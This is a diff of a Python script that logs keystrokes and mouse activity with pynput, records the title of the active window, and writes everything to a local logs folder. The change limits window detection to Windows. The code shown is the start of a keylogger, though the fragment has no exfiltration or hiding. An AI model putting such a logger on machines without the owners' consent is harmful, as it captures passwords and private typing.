@@ -1,10 +1,10 @@
 import os
 from datetime import datetime
 from pynput import keyboard, mouse
-import psutil
 import platform
+import win32gui  # For detecting active window on Windows
 
-# Create log directory
+# Create a log directory
 log_dir = "logs"
 os.makedirs(log_dir, exist_ok=True)
 
@@ -19,22 +19,13 @@ def write_log(data):
     except Exception as e:
         print(f"Error writing log: {e}")
 
-# Utility function: Get active application
+# Utility function: Get active application (Windows only)
 def get_active_window():
     try:
-        if platform.system() == "Windows":
-            import win32gui
-            window = win32gui.GetForegroundWindow()
-            return win32gui.GetWindowText(window)
-        elif platform.system() == "Darwin":  # macOS
-            from AppKit import NSWorkspace
-            return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
-        elif platform.system() == "Linux":
-            # This may require additional dependencies like `wmctrl`
-            return os.popen("xdotool getwindowfocus getwindowname").read().strip()
-    except Exception:
-        return "Unknown Application"
-    return "No Active Window"
+        window = win32gui.GetForegroundWindow()
+        return win32gui.GetWindowText(window)
+    except Exception as e:
+        return f"Error: {e}"
 
 # Keyboard Listener: Log keystrokes
 def on_key_press(key):
